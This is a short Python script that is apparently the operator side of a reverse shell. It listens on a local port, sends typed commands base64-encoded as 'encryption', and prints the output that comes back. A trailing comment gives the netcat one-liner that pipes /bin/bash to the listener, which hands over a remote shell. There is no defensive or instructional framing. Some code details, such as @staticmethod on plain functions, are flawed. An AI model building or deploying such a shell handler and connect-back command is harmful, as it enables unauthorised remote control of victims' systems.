import base64
import socket
import select

HOST = "127.0.0.1"
PORT = 9999

def is_socket_valid(socket):
    readable, writable, exceptional = select.select([socket], [], [], 0)
    if not readable:
        return True
    return False

@staticmethod
def encrypt(data):
    return base64.b64encode(data)

@staticmethod
def decrypt(data):
    return base64.b64decode(data)

def cmd_loop(session):
    while True:
        if not is_socket_valid(session):
            break
        command = input(f"Session > ")
        command = f'{command}'  # Wrap command in quotes

        # Encrypt the command and send it to the server
        enc_command = encrypt(command.encode('utf-8') + b"\n")
        session.sendall(enc_command)

        # Receive the response and decrypt it
        data = session.recv(1024)
        data_decrypt = decrypt(data).decode()

        if data_decrypt:
            response_lines = data_decrypt.split('\n')
            for line in response_lines:
                print(f"{line}")

def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    listener.bind((HOST, PORT))
    listener.listen()
    mysocket, addr = listener.accept()
    cmd_loop(mysocket)


if __name__ == "__main__":
    main()
    # nc -nv 127.0.0.1 9999 -e /bin/bash